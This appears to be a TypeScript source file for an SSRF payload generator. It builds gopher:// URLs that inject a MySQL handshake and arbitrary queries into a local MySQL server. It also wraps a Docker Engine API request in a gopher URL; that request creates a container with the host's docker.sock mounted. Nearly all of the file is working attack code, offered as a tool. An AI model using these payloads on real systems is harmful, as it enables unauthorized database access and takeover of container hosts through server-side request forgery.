import create from 'zustand';


type State = {
  payload: string,
  setPayload: (payload: string) => void,
  MySQLUsername: string,
  setMySQLUsername: (username: string) => void,
  generateMysqlSSRF: (username: string, query: string) => string,
};

export enum GopherPayload {
  MySQL = "MySQL | Require valid user with no authentication",
  Zabbix = "Zabbix ",
  Custom = "Custom Raw TCP",
}

export const payloadOptions = Object.values(GopherPayload);

// TODO: implement localStorage persistence  
export const useStore = create<State>((set) => ({
  payload: GopherPayload.MySQL,
  MySQLUsername: "", 
  setMySQLUsername: (MySQLUsername) => set({MySQLUsername}),
  setPayload: (payload) => set({ payload }),
  generateMysqlSSRF: (username, query) => {
    const encoder = new TextEncoder();
    const decoder = new TextDecoder();

    const encodeToHex = (input: string) =>
      Array.from(encoder.encode(input), byte => ('0' + byte.toString(16)).slice(-2)).join('');

    const usernameHex = encodeToHex(username);
    const userLength = username.length;
    const temp = userLength - 4;
    const length = (0xa3 + temp).toString(16).padStart(2, '0');

    let dump = length + "00000185a6ff0100000001210000000000000000000000000000000000000000000000";
    dump += usernameHex;
    dump += "00006d7973716c5f6e61746976655f70617373776f72640066035f6f73054c696e75780c5f636c69656e745f6e616d65086c";
    dump += "69626d7973716c045f7069640532373235350f5f636c69656e745f76657273696f6e06352e372e3232095f706c6174666f726d";
    dump += "067838365f36340c70726f6772616d5f6e616d65056d7973716c";

    const auth = dump.replace("\n", "");

    const encode = (s: string) => {
      const hexArray = s.match(/.{1,2}/g) || [];
      return "gopher://127.0.0.1:3306/_%" + hexArray.join('%');
    }

    const getPayload = (query: string) => {
      if (query.trim() !== '') {
        const queryHex = encodeToHex(query);
        const queryLength = (queryHex.length / 2 + 1).toString(16).padStart(6, '0');
        const queryLengthHex = Array.from(queryLength.match(/.{1,2}/g) || []).reverse().join('');
        const pay1 = queryLengthHex + "0003" + queryHex;
        return encode(auth + pay1 + "0100000001");
      } else {
        return encode(auth);
      }
    }

    return getPayload(query);
  },
}));



// URL Gopherizer
function toGopherUrl(host, port, data) {
  // Replace the necessary characters in the data string with their URL-encoded equivalents.
  let formattedData = encodeURIComponent(data.replace(/\n/g, "\r\n"));

  // Construct and return the Gopher URL.
  return `gopher://${host}:${port}/_${formattedData}`;
}

let host = "localhost";
let port = 2375;
let data = `
POST /v1.24/containers/create HTTP/1.1
Content-Type: application/json

{
  "Image": "ubuntu",
  "Cmd": ["/bin/bash", "-c", "sleep infinity"],
  "ExposedPorts": {
    "80/tcp": {}
  },
  "HostConfig": {
    "Binds": ["/var/run/docker.sock:/var/run/docker.sock"],
    "PortBindings": {
      "80/tcp": [
        {
          "HostPort": "8080"
        }
      ]
    }
  }
}`;
